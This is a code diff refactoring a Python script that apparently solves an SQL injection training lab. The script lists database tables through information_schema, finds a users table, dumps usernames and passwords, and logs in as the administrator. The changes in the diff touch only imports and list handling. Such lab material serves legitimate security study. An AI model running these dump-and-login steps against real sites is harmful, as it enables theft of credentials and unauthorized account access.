@@ -2,12 +2,11 @@
 """
 SQL injection attack, listing the database contents on non-Oracle databases
 """
+
 import re
 
-import lab_07
+from lab_07 import Lab
 
-class Lab(lab_07.Lab):
-    """Wrapper"""
 
 def main() -> None:
     """Entry point"""
@@ -18,7 +17,7 @@ def main() -> None:
     response = site.dump_table(["table_name", "NULL"],
                                table="information_schema.tables")
     tables = site.parse_html_table(response.text)
-    users_table = [table for table in tables if re.match("^users_", table)][0]
+    users_table = next(table for table in tables if re.match("^users_", table))
 
     response = site.dump_table(["column_name", "NULL"],
                                table="information_schema.columns",
@@ -33,12 +32,13 @@ def main() -> None:
     response = site.dump_table([username_table, password_table],
                                table=users_table)
     users = site.parse_html_user_table(response.text)
-    admin = [user for user in users if user.name == "administrator"][0]
+    admin = next(user for user in users if user.name == "administrator")
 
     csrf = site.csrf_token("/login")
     response = site.login(admin.name, admin.password, csrf=csrf)
     response.raise_for_status()
     print(response.status_code)
+
 
 if __name__ == "__main__":
     main()
